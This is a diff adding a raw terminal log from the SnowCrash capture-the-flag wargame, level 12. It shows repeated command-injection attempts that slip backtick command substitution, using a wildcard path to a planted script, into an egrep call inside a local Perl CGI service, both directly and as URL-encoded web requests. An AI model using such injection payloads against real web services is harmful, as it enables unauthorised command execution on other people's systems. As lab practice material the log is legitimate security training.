@@ -1,0 +1,48 @@
+^C
+level12@SnowCrash:~$ wget --tries 20 'http://localhost:4646/?x=%28%22%3B%2F%2A%2F%2A%2F%2A.SALUT%22?y=323' -O output 2>/dev/null;  cat  output; echo ;^C
+level12@SnowCrash:~$ egrep ""asdf
+^C
+level12@SnowCrash:~$ egrep ""%%
+^C
+level12@SnowCrash:~$ egrep ""%%^C
+level12@SnowCrash:~$ ./test.pl '`;/*/*/*.SALUT`"'
+Content-type: text/html
+
+egrep "^`;/*/*/*.SALUT`"" /tmp/xd 2>&1sh: 1: Syntax error: ";" unexpected
+.level12@SnowCrash:~$ ./test.pl '"`;/*/*/*.SALUT`"'
+Content-type: text/html
+
+egrep "^"`;/*/*/*.SALUT`"" /tmp/xd 2>&1sh: 1: Syntax error: ";" unexpected
+.level12@SnowCrash:~$ ./test.pl '`/*/*/*.SALUT`"'
+Content-type: text/html
+
+egrep "^`/*/*/*.SALUT`"" /tmp/xd 2>&1sh: 1: Syntax error: Unterminated quoted string
+.level12@SnowCrash:~$ ./test.pl '`/*/*/*.SALUT`"'
+Content-type: text/html
+
+egrep "^`/*/*/*.SALUT`"" /tmp/xd 2>&1sh: 1: Syntax error: Unterminated quoted string
+.level12@SnowCrash:~$ ./test.pl '`/*/*/*.SALUT`'
+Content-type: text/html
+
+egrep "^`/*/*/*.SALUT`" /tmp/xd 2>&1..level12@SnowCrash:~$ ^C
+level12@SnowCrash:~$ rm /var/crash/flag12
+level12@SnowCrash:~$ ./test.pl '"`;/*/*/*.SALUT`"'^C
+level12@SnowCrash:~$ wget --tries 20 'http://localhost:4646/?x=%28%22%3B%2F%2A%2F%2A%2F%2A.^CLUT%22?y=323' -O output 2>/dev/null;  cat  output; echo ;
+level12@SnowCrash:~$ fg
+vim ./test.pl
+
+[2]+  Stopped                 vim ./test.pl
+(reverse-i-search)`cat ': wget --tries 20 'http://localhost:4646/?x=%28%22%3B%2F%2A%2F%2A%2F%2A.SALUT%22?y=323' -O output 2>/dev/null;  ^Ct  output; echo ;
+(reverse-i-search)`': rm /var/^Cash/flag12
+(reverse-i-search)`per': ps aux | grep ^Crl
+level12@SnowCrash:~$ ./test.pl '"`;/*/*/*.SALUT`"'^C
+level12@SnowCrash:~$ wget --tries 20 'http://localhost:4646/?x=%60%2F%2A%2F%2A%2F%2A.SALUT%60?y=323' -O output 2>/dev/null;  cat  output; echo ;
+..
+level12@SnowCrash:~$ cat /var/
+backups/ cache/   crash/   lib/     local/   lock/    log/     mail/    opt/     run/     spool/   tmp/     www/
+level12@SnowCrash:~$ cat /var/crash/
+flag             flag11           flag12           script_12.SALUT  script_12.sh     sdf              test12           whoami
+level12@SnowCrash:~$ cat /var/crash/
+flag             flag11           flag12           script_12.SALUT  script_12.sh     sdf              test12           whoami
+level12@SnowCrash:~$ cat /var/crash/script_12.SALUT
+  getflag > /var/crash/flag12
